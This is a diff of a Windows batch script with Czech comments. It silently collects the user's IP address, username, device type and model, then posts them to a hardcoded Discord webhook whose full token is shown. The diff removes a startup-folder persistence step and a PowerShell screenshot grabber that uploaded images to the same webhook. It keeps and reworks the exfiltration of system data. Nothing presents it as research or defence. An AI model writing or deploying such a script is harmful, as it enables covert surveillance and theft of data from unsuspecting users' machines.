@@ -2,14 +2,10 @@
 chcp 65001 >nul
 setlocal EnableDelayedExpansion
 
+:: ──────────────── SYSTEMOVÉ INFO ────────────────
+
 :: 🌐 Webhook
 set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"
-
-:: 📂 Samonáprava (TEMP + autostart)
-set "bootbat=%TEMP%\boot.bat"
-set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\boot.bat"
-if not exist "%bootbat%" copy /y "%~f0" "%bootbat%" >nul
-if not exist "%startup%" copy /y "%bootbat%" "%startup%" >nul
 
 :: 🌍 IP + uživatel
 for /f "delims=" %%x in ('curl -s https://api.ipify.org') do set "ip=%%x"
@@ -41,31 +37,22 @@ for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
     )
 )
 
-:: 🧾 Zpráva – každý řádek zvlášť, IP s || před i za
-set "msg=🛰️ **Systémové info:**^
+:: 🧾 Zpráva – IP s ||, RAM odstraněna, každý řádek zvlášť
+set "msg=🛰️ Systémové info:^
 IP: ||!ip! ||^
 Čas: !timestamp!^
 Uživatel: !user!^
 Zařízení: !deviceType!^
 Model: !deviceModel!"
 
-:: 📤 Odeslání na webhook
-curl -s -X POST %webhook% -d "content=!msg!" >nul
+:: ──────────────── ODESLÁNÍ NA WEBHOOK ────────────────
 
-:: 📸 Screenshot
-set "ss=%TEMP%\screenshot_%RANDOM%.png"
-powershell -ExecutionPolicy Bypass -Command ^
-"Add-Type -AssemblyName System.Windows.Forms; ^
-Add-Type -AssemblyName System.Drawing; ^
-$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; ^
-$bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; ^
-$graphics = [Drawing.Graphics]::FromImage($bmp); ^
-$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); ^
-$bmp.Save('%ss%', [Drawing.Imaging.ImageFormat]::Png)"
+set "payload=%TEMP%\payload.json"
+echo { > "!payload!"
+echo   "content": "!msg!" >> "!payload!"
+echo } >> "!payload!"
+curl -s -X POST %webhook% -H "Content-Type: application/json" --data "@!payload!" >nul
+del /f /q "!payload!"
 
-if exist "%ss%" (
-    curl -s -X POST %webhook% -F "file=@%ss%;type=image/png" >nul
-    del /f /q "%ss%"
-)
-
+:: ✅ Hotovo
 exit
